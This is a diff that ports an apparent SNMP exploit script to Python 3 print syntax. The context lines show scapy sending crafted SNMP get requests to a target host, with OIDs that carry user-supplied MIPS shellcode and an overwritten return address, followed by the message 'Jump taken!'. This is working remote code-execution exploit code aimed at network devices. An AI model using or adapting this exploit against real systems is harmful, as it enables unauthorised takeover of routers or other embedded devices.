@@ -1,3 +1,4 @@
+from __future__ import print_function
 from scapy.all import *
 from time import sleep
 from struct import pack, unpack
@@ -33,7 +34,7 @@ if __name__ == '__main__':
 
 
     sh_buf = args.shellcode.replace(' ','').decode('hex')
-    print 'Writing shellcode to 0x{}'.format(shellcode_start.encode('hex'))
+    print('Writing shellcode to 0x{}'.format(shellcode_start.encode('hex')))
     if 'capstone' in sys.modules: 
         md = cs.Cs(cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS32 | cs.CS_MODE_BIG_ENDIAN)
 
@@ -72,4 +73,4 @@ if __name__ == '__main__':
         zero = bin2oid('\x00\x00\x00\x00')
         payload = alps_oid.format(zero, zero, zero, zero, zero, zero, zero, ra, zero, zero, zero, zero)
         send(IP(dst=args.host)/UDP(sport=161,dport=161)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))
-        print 'Jump taken!'
+        print('Jump taken!')
